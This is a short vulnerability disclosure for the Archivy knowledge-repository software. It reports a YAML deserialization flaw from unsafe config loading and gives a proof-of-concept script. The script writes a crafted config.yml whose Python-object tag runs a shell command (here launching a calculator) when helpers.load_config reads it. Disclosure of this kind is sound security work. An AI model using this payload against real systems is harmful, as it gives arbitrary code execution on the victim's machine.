# Description
Archivy is a self-hosted knowledge repository that allows you to safely preserve useful content that contributes to your knowledge bank.
* **Vulnerability description**
    Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept
Run exploit.py
```python
import os
#os.system('pip3 install archivy')
from archivy import helpers
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(exploit)
helpers.load_config('.')
```
* `pip3 install archivy`
* `python3 exploit.py`
